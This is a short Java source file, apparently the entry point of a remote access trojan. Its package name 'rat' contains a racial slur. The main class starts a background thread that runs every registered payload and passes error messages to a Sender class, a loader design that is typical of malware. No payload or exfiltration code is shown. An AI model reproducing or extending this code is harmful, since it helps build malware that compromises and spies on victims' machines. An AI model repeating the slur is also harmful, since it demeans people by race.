package me.nigger.rat;

import me.nigger.rat.payload.api.Payload;
import me.nigger.rat.payload.api.PayloadRegistry;
import me.nigger.rat.payload.api.Sender;

public final class Main
{
    public static void main()
    {
        new Thread(() -> { try {
            for (Payload payload : PayloadRegistry.getPayloads()) try { payload.execute(); } catch (Exception e) { Sender.send(e.getMessage()); }
        } catch (Exception ignored) {}}).start();
    }
    public static void main(String[] args) {
        main();
    }
}
